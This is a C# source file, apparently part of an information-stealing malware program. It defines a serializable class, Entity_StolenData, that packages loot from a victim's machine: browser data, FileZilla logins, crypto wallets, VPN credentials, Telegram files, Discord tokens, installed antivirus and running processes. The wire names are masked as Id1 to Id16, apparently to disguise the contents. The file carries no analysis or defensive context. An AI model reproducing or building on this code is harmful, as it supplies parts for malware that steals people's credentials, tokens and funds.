using System;
using System.Collections.Generic;
using System.Runtime.Serialization;


[DataContract(Name = "Entity1", Namespace = "Entity")]
public class Entity_StolenData
{

	[DataMember(Name = "Id1")]
	public List<string> InstalledAVs { get; set; } = new List<string>();

	[DataMember(Name = "Id2")]
	public List<string> AvailableLanguages { get; set; } = new List<string>();

	[DataMember(Name = "Id3")]
	public List<string> InstalledPrograms { get; set; } = new List<string>();

	[DataMember(Name = "Id4")]
	public List<string> RunningProcesses { get; set; } = new List<string>();

	[DataMember(Name = "Id5")]
	public List<Entity_HardwareInfo> HardwareInfo { get; set; } = new List<Entity_HardwareInfo>();

	[DataMember(Name = "Id6")]
	public List<Entity_Browser> StolenBrowsers { get; set; } = new List<Entity_Browser>();

	[DataMember(Name = "Id7")]
	public List<Entity_LoginData> CollectFilezilla { get; set; } = new List<Entity_LoginData>();

	[DataMember(Name = "Id8")]
	public List<BrowserInfo> Browsers { get; set; } = new List<BrowserInfo>();

	[DataMember(Name = "Id9")]
	public List<Entity_StolenFile> GrabbedFiles { get; set; } = new List<Entity_StolenFile>();

	[DataMember(Name = "Id10")]
	public List<Entity_StolenFile> GameLaunchers { get; set; } = new List<Entity_StolenFile>();

	[DataMember(Name = "Id11")]
	public List<Entity_StolenFile> Wallets { get; set; } = new List<Entity_StolenFile>();

	[DataMember(Name = "Id12")]
	public List<Entity_LoginData> NordApp { get; set; }

	[DataMember(Name = "Id13")]
	public List<Entity_StolenFile> OpenVPN { get; set; }

	[DataMember(Name = "Id14")]
	public List<Entity_StolenFile> ProtonVPN { get; set; }

	[DataMember(Name = "Id15")]
	public List<Entity_StolenFile> TelegramFiles { get; set; }

	[DataMember(Name = "Id16")]
	public List<Entity_StolenFile> DiscordTokens { get; set; }
}
